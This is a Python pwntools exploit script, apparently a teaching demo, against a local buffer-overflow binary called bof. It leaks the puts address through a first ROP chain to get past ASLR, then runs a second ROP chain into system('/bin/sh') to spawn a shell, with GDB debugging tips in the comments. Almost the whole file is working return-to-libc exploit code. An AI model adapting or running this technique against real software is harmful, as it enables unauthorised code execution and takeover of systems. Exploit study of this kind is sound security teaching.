#!/usr/bin/python

"""
Example Exploit for bof.c
Author: Gregory Sanders (Ntropy)

This version should work in the presence of ASLR,
by leaking a function pointer in libc at runtime,
reentering our vulnerable function, and then
using our newly acquired data to return into libc.
"""

from pwn import *

DEBUG = True #Change me to true to follow along!
binary = "/opt/ROPDemo/bof"
libc_loc = "/lib32/libc.so.6"

#ELF from pwn allows us to use dynamically find static addresses for functions.
e = ELF(binary)
libc = ELF(libc_loc)

libc_base = 0

#Launch process
p = process(binary)

"""No ASLR, only free addresses in shared libraries."""

if not DEBUG:
    #libc_base = 0xf7e18000
    pass
else:
    """ A change in environment, like when debugging, can change where libraries load.
        In GDB, you can run `info proc` to get the process id of the target process,
        and then wait for the library to load, before running `shell cat /proc/<procid>/maps`.
        The first address for libc.so.6 will be where it has loaded."""
    #libc_base = 0xf7e18000 
    print "run: gdb -p {}".format(p.pid)
    raw_input("Hit enter after attaching...")

"""
# Breakdown on debugging ROP chains
If now debugging, run:
    disas vulnerable
Set a breakpiont for the very end.
    ...
    0x08048513 <+143>:   leave
    0x08048514 <+144>:   ret
    ...
    break *0x8048514 #Or b*0x8048514
You can then just hit 'c' to continue until the breakpoint.
Remember to hit enter in the Python script.

A single instruction at a time, you can enter 'stepi' to first watch the CPU enter
puts(). You can use the 'return' command then to step back out of the function, and
enter back into vulnerable().

Hit 'c' again, and the new information from the Python script should be used
to hijack control flow once more as soon as you get past the next return.

Another shell should spawn.
"""

#Build payload
payload = "A"*(28 + 4 ) #Overflow buffer, and stored framebuffer


#Calling puts(e.got['puts']) to find where puts is.
rop = ""
rop += p32(e.plt['puts'])
rop += p32(e.symbols['vulnerable']) 
rop += p32(e.got['puts'])

""" Register-using calling convention 
rop += p32(pop_edi_ret)
rop += p32(binsh) #p32 packs your number into a 32-bit word in str representation.
rop += p32(libc_base + libc.symbols['system'])
"""

#Add ROP Chain to payload
payload += rop

#Overflow buffer
p.sendline(payload) 
print p.recv()

#Launch 1st ROP chain
p.sendline()
print p.recvuntil("Data changed!\n")
print p.recvuntil("Data changed!\n")
puts = unpack(p.recv(4)) #unpack from string to 32-bit int
print "puts:", hex(puts)
p.recvline()

#Build ROP chain
libc_base = puts - libc.symbols['puts'] #We can subtract this offset to find base of libc
print "Libc:", hex(libc_base) 
pop_edi_ret = libc_base + 0x000177db
binsh = libc_base + 0x15902b #Offset of "/bin/sh\x00" within libc
system = libc_base + libc.symbols['system']

#Build payload
payload = "A"*(28 + 4 ) #Overflow buffer, and stored framebuffer

rop = ""
rop += p32(system)
rop += p32(0x41414141)
rop += p32(binsh)

payload += rop

#Launch 2nd ROP chain.
p.sendline(payload)
p.sendline()

#Shell
p.interactive()
